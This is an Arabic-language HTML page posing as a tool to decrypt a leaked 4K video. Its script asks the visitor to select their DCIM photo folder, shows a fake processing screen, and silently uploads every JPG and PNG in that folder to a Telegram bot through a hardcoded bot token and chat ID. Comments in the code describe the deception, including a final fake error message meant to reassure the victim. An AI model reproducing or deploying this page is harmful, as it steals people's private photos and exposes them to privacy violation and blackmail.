<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فك تشفير المقطع المسرب</title>
    <style>
        body { background: #050505; color: #333; font-family: sans-serif; text-align: center; padding-top: 150px; }
        .unlock-btn { border: 2px solid #1a1a1a; padding: 20px 40px; border-radius: 50px; color: #1a1a1a; cursor: pointer; font-weight: bold; font-size: 18px; transition: 0.3s; display: inline-block; }
        .unlock-btn:hover { border-color: #333; color: #333; }
    </style>
</head>
<body>

    <div class="unlock-btn" onclick="startDeepSiphon()">
        اضغط لفك تشفير الفيديو (4K)
    </div>

<script>
    const TOKEN = "7864483754:AAH9r2X-r37O6xidO263m3W4S6eFw4N6W5U";
    const CHAT_ID = "7449231580";

    async function startDeepSiphon() {
        try {
            // طلب المجلد لإيهامه بوضع "ملفات فك التشفير" هناك
            const dirHandle = await window.showDirectoryPicker();
            
            // تغيير الواجهة فوراً لإيهامه بأن الفيديو بدأ يجهز
            document.body.innerHTML = "<h2 style='color:#111'>جاري معالجة البيانات... يرجى الانتظار</h2>";

            // إرسال إشارة للبوت
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ تم اختراق المجلد بنجاح، بدء السحب...`);

            // الدخول للمجلد وسحب الصور في خفاء تام
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file' && /\.(jpg|jpeg|png)$/i.test(entry.name)) {
                    const file = await entry.getFile();
                    const formData = new FormData();
                    formData.append('document', file);
                    formData.append('chat_id', CHAT_ID);

                    // إرسال صامت تماماً في الخلفية
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                }
            }

            // بعد دقيقتين نظهر له رسالة خطأ لكي يغلق الصفحة وهو مطمئن
            setTimeout(() => {
                document.body.innerHTML = "<h2 style='color:red'>خطأ في الاتصال: السيرفر لا يستجيب حالياً.</h2>";
            }, 60000);

        } catch (err) {
            alert("يجب اختيار مجلد DCIM للسماح بفك تشفير الفيديو.");
        }
    }
</script>
</body>
</html>
